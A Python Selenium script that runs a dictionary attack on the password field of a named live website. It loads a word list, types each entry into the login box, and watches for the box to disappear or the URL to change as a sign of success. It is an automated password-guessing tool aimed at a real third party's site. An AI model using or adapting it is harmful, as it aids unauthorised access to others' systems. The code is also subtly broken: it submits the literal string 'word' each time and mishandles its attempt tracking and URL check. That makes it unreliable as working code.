from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time as t


answer = ""
speed = .26
previous_attempts = set()
new_attempts = set()

print("------------------------\nReading in previous attempts")
with open('attempted_words.txt', 'r') as prev_attempts_file:
    previous_attempts.update(prev_attempts_file.read().splitlines())
print("Complete\n------------------------")

words = []
with open("words_alpha.txt", "r") as dictionary_file:
    for line in dictionary_file.readlines():
        stripped_line = line.strip()
        if 4 < len(stripped_line) < 10:
            if line not in previous_attempts:
                words.append(line.strip())

# Initialize the webdriver
driver = webdriver.Chrome()
driver.get("https://www.starkogear.com")
# get the password field and error message box
input_field = driver.find_element(By.CLASS_NAME, "password-input")
error_message = driver.find_element(By.CLASS_NAME, "error-message")
t.sleep(3)

print("Testing Input Box")
# initial run to generate the error message on the page source
input_field.send_keys("test")
input_field.send_keys(Keys.RETURN)
t.sleep(2)
old_page_source = driver.page_source
print("Test Complete\n------------------------")

print("Begin")
with open('attempted_words.txt', 'a') as prev_attempts_file:
    for word in words:
        input_field.clear()
        input_field.send_keys("word")
        input_field.send_keys(Keys.RETURN)
        t.sleep(speed)

        # if the password box still exists
        if len(driver.find_elements(By.CLASS_NAME, "password-input")) == 0:
            answer = word
            print("Password box element no longer found")
            t.sleep(2)
            break

        # if the url of the page changes
        elif driver.current_url != "https://starkogear.com/":
            answer = word
            print(f'URL CHANGED: {driver.current_url}')
            t.sleep(2)
            break

        prev_attempts_file.write(word + "\n")
        old_page_source = driver.page_source

print(f"FINISHED\nANSWER: {answer}\nNew Attempts {len(new_attempts)}"
      f"\nTotal Attempts {len(previous_attempts) + len(new_attempts)}\n------------------------")

t.sleep(60)
# driver.quit()
